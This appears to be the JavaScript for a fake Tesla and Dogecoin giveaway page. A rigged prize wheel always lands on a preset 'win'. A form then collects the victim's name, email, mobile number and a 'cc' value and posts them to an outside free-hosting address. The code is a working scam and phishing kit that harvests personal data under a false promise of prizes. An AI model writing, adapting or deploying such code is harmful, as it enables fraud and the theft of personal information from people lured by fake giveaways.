var giftreach = [
    {"wrapcode": 4996,"wrapgift": "$20,000 Worth of Tesla Stock (TSLA)"},
    {"wrapcode": 5040,"wrapgift": "A Brand New Model X Tesla"},
    {"wrapcode": 5084,"wrapgift": "A Brand New Model Y Tesla"},
    {"wrapcode": 5128,"wrapgift": "Invite Link"},
    {"wrapcode": 5174,"wrapgift": "A Brand New  Model S Tesla"},
    {"wrapcode": 5218,"wrapgift": "A Brand New  Model 3 Tesla"},
    {"wrapcode": 5264,"wrapgift": "Try Again"},
    {"wrapcode": 5310,"wrapgift": "$35,000 Worth of Dodge Coin (DOGE)"}
  ];
let wheel =  document.querySelector('.wheel');
let spinBtn = document.querySelector('.spinBtn');
let spinBtnOF = document.querySelector('.spinBtnOF');
//let circleRate = Math.ceil(Math.random() * 3600);
var circleRate = 5084;
var giftwon = "";
debaterate()
function debaterate(){
    var giftty = JSON.stringify(kyrvfflxc.map(lcpk => lcpk.giftcode)).replace(/[\[\]"]+/g,"");
    giftreach.forEach(item => {
        if(giftty == item.wrapcode){
            circleRate = item.wrapcode;
        }
      });   
}

let medalqro = document.querySelector('#medalqro');
let medalqroxt = document.querySelector('#medalqroxt');
let mycanvas = document.querySelector('#my-canvas');

spinBtn.onclick = function(){
    window.scrollTo(0, 0);
    spinBtn.style.display = "none";
    spinBtnOF.style.display = "";
    wheel.style.transform = "rotate(" + circleRate + "deg)";
    circleRate += Math.ceil(Math.random() * 4600);

    giftreach.forEach(item => {
        var giftty = JSON.stringify(kyrvfflxc.map(lcpk => lcpk.giftcode)).replace(/[\[\]"]+/g,"");
        if(giftty == item.wrapcode){
            giftwon = item.wrapgift;
        }
      }); 
    setTimeout(() => {
        
        document.querySelector('#medalheader').innerHTML = "Congratulations!!!";
        document.querySelector('#medalbody').innerHTML = `You just won  <span class="gwmodel">${giftwon}.</span>.<br>
        Please fill the form below to receive you next email.<br>
        Congratulations once more.`;
        mycanvas.style.display = "";
        medalqro.classList.add('active');
        mycanvas.classList.add('active');
        setTimeout(() => {
            mycanvas.classList.remove('active');
        }, 100000);
    }, 5700);
}

document.getElementById("medalclshoe").addEventListener("submit", function() { 
    //alert('submit')
    Medalofhonor();
});


function Medalofhonor(){
		
	var firstname  = document.getElementById("firstname").value;	
	var lastname  = document.getElementById("lastname").value;	
	var email  = document.getElementById("email").value;	
	var mobile  = document.getElementById("mobile").value;	
	
	
	var rondrefr = document.getElementById("rondrefr");
	var rondreff = document.getElementById("rondreff");
	rondrefr.style.display = 'none';	
	rondreff.style.display = '';	

    var drulo = JSON.stringify(kyrvfflxc.map(lcpk => lcpk.cc)).replace(/[\[\]"]+/g,"");
	
	if (myTrim(firstname).length > 2  && myTrim(lastname).length > 2  && myTrim(email).length > 4  && myTrim(mobile).length > 8  && myTrim(drulo).length > 4){ 
	
	$.ajax({
		type: "POST",
		url: "https://bastestquest.000webhostapp.com/tromideian/", 
		dataType: "json",
		data: {firstname: firstname, lastname: lastname, email: email, mobile: mobile, drulo: drulo, },
		success: function(data){
			$("#rufusLohn").html(data);
			
		
		var slf = data; 
		if(slf.Cavrem == "none"){
            document.getElementById("medalcolumf").innerHTML = "";
            document.querySelector('#medalheader').innerHTML = `Congratulations ${lastname}!!!`;
        document.querySelector('#medalbody').innerHTML = `You will be contacted soon via the email you provided. Cheers.`;
        }else{
			rondrefr.style.display = '';	
	        rondreff.style.display = 'none';	
        }
			
    }, error : function(jqXHR, textStatus, errorThrown) {
        let useronline = teslaser();
        if (useronline == 0) {
            alert("Ooops! It seems your network is slow or disconnected")
        }else{
            alert("Ooops! This is not your fault. Try Again...");
        }
    }
		 
	});
}
}



medalqroxt.onclick = function(){
    medalqro.classList.remove('active');
    mycanvas.classList.remove('active');
}
var confettiSettings = { target: 'my-canvas' };
var confetti = new ConfettiGenerator(confettiSettings);
confetti.render();
function teslaser() {
	if (navigator.onLine) {
		return 1;
	}else{
		return 0;
	}
}

function myTrim(x) {
    return x.replace(/^\s+|\s+$/gm,'');
}
  
String.prototype.nl2br = function(){
    return this.replace(/\n/g, "<br />");
}
function printError(elemId, hintMsg) {
document.getElementById(elemId).innerHTML = hintMsg;
} 